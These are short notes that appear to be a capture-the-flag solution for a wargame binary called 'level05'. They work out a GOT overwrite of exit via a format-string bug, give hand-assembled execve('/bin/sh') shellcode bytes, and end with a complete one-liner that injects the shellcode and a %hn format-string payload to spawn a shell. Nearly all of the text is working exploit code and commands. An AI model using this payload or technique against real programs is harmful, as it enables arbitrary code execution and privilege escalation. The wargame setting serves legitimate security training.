info function exit -> 0x08048370
x/i 0x08048370 -> 0x80497e0
real address of exit is 0x080497e0

0xffffdda8
address of buffer
we divide in two parts so

0xffff -> 65535 in decimal
0xdda8 -> 56744 in decimal so

65535 in 0x080497e2
56744 in 0x080497e0

28 + 4 + 4 = 36
%17$p is 0x080497e0
%18$p is 0x080497e2

nasm -f elf32 shellcode.asm
ld -m elf_i386 shellcode.o
xxd -p shellcode.o

custom shellcode raw version -> \x90\x90\x90\x90\x90\x31\xc0\x31\xdb\xb0\x0b\x89\x1c\x24\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xcd\x80

hexa characters forbidden range : 41 to 5A

(python -c 'print "\x90\x90\x90\x90\x90\x31\xc0\x31\xdb\xb0\x0b\x89\x1c\x24\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xcd\x80" + "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%56708x%17$hn%8791x%18$hn"' ; cat) | env -i PWD="/home/users/level05" SHELL="/bin/bash" SHLVL=0 /home/users/level05/level05
